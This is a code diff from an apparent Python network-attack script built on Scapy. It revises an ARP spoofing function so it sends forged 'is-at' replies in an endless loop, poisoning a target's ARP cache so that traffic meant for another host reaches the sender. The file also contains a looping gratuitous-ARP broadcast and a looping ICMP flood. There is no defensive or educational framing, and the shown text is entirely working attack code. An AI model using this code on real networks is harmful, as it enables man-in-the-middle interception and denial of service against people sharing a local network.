@@ -323,13 +323,27 @@ def get_mac(ip):
 
 def broastcast(target_ip):
     send(ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=target_ip, op='is-at'), verbose=0,loop=1)
-def spoof(target_ip, host_ip, verbose=True):
+
+def arp_spoof(target_ip, host_ip,verbose=True):
     target_mac = get_mac(target_ip)
-    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    send(arp_response, verbose=0)
-    if verbose:
-        self_mac = ARP().hwsrc
-        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+    while True:
+        send(ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at'), verbose=0)
+        if verbose:
+            self_mac = ARP().hwsrc
+            print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+    
+# def arp_spoof(target_ip, host_ip):
+#     while True:
+#         spoof(target_ip, host_ip, verbose=True)
+#         spoof(host_ip, target_ip, verbose=True)
+
+# def spoof(target_ip, host_ip, verbose=True):
+#     target_mac = get_mac(target_ip)
+#     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+#     send(arp_response, verbose=0)
+#     if verbose:
+#         self_mac = ARP().hwsrc
+#         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
 def icmp(target):
     send(IP(dst=target)/ICMP(),loop=1)
